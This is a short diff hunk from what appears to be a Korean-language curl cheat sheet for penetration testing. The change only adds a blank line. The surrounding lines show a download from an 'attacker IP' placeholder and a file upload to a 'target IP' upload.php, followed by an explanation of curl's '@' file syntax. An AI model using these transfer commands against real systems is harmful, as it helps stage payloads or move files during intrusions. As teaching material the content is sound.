@@ -72,4 +72,5 @@ curl -O http://공격자IP:8000/파일명
 ```bash
 curl -F "file=@/경로/파일명" http://타겟IP/upload.php
 ```
+
 `@`는 curl에서 파일 업로드할 때 로컬 파일임을 나타내는 표시입니다. `-F` 옵션과 함께 사용합니다.
